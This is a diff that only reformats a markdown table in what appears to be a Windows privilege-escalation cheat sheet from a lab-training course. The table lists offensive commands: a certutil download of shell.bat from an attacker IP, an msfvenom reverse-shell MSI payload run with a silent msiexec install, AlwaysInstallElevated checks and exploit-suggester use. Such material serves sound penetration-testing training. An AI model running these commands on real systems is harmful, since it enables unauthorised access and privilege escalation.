@@ -108,21 +108,22 @@
 
 ## Other Commands
 
-|**Command**|**Description**|
-|---|---|
-|`certutil.exe -urlcache -split -f http://10.10.14.3:8080/shell.bat shell.bat`|Transfer file with certutil|
-|`certutil -encode file1 encodedfile`|Encode file with certutil|
-|`certutil -decode encodedfile file2`|Decode file with certutil|
-|`reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer`|Query for always install elevated registry key (1)|
-|`reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer`|Query for always install elevated registry key (2)|
-|`msfvenom -p windows/shell_reverse_tcp lhost=10.10.14.3 lport=9443 -f msi > aie.msi`|Generate a malicious MSI package|
-|`msiexec /i c:\users\htb-student\desktop\aie.msi /quiet /qn /norestart`|Executing an MSI package from command line|
-|`schtasks /query /fo LIST /v`|Enumerate scheduled tasks|
-|`Get-ScheduledTask \| select TaskName,State`|Enumerate scheduled tasks with PowerShell|
-|`.\accesschk64.exe /accepteula -s -d C:\Scripts\`|Check permissions on a directory|
-|`Get-LocalUser`|Check local user description field|
-|`Get-WmiObject -Class Win32_OperatingSystem \| select Description`|Enumerate computer description field|
-|`guestmount -a SQL01-disk1.vmdk -i --ro /mnt/vmd`|Mount VMDK on Linux|
-|`guestmount --add WEBSRV10.vhdx --ro /mnt/vhdx/ -m /dev/sda1`|Mount VHD/VHDX on Linux|
-|`sudo python2.7 windows-exploit-suggester.py --update`|Update Windows Exploit Suggester database|
-|`python2.7 windows-exploit-suggester.py --database 2021-05-13-mssb.xls --systeminfo win7lpe-systeminfo.txt`|Running Windows Exploit Suggester|
+| **Command**                                                                                                 | **Description**                                    |
+| ----------------------------------------------------------------------------------------------------------- | -------------------------------------------------- |
+| `certutil.exe -urlcache -split -f http://10.10.14.3:8080/shell.bat shell.bat`                               | Transfer file with certutil                        |
+| `certutil -encode file1 encodedfile`                                                                        | Encode file with certutil                          |
+| `certutil -decode encodedfile file2`                                                                        | Decode file with certutil                          |
+| `reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer`                                 | Query for always install elevated registry key (1) |
+| `reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer`                                              | Query for always install elevated registry key (2) |
+| `msfvenom -p windows/shell_reverse_tcp lhost=10.10.14.3 lport=9443 -f msi > aie.msi`                        | Generate a malicious MSI package                   |
+| `msiexec /i c:\users\htb-student\desktop\aie.msi /quiet /qn /norestart`                                     | Executing an MSI package from command line         |
+| `schtasks /query /fo LIST /v`                                                                               | Enumerate scheduled tasks                          |
+| `Get-ScheduledTask \| select TaskName,State`                                                                | Enumerate scheduled tasks with PowerShell          |
+| `.\accesschk64.exe /accepteula -s -d C:\Scripts\`                                                           | Check permissions on a directory                   |
+| `Get-LocalUser`                                                                                             | Check local user description field                 |
+| `Get-WmiObject -Class Win32_OperatingSystem \| select Description`                                          | Enumerate computer description field               |
+| `guestmount -a SQL01-disk1.vmdk -i --ro /mnt/vmd`                                                           | Mount VMDK on Linux                                |
+| `guestmount --add WEBSRV10.vhdx --ro /mnt/vhdx/ -m /dev/sda1`                                               | Mount VHD/VHDX on Linux                            |
+| `sudo python2.7 windows-exploit-suggester.py --update`                                                      | Update Windows Exploit Suggester database          |
+| `python2.7 windows-exploit-suggester.py --database 2021-05-13-mssb.xls --systeminfo win7lpe-systeminfo.txt` | Running Windows Exploit Suggester                  |
+|                                                                                                             |                                                    |
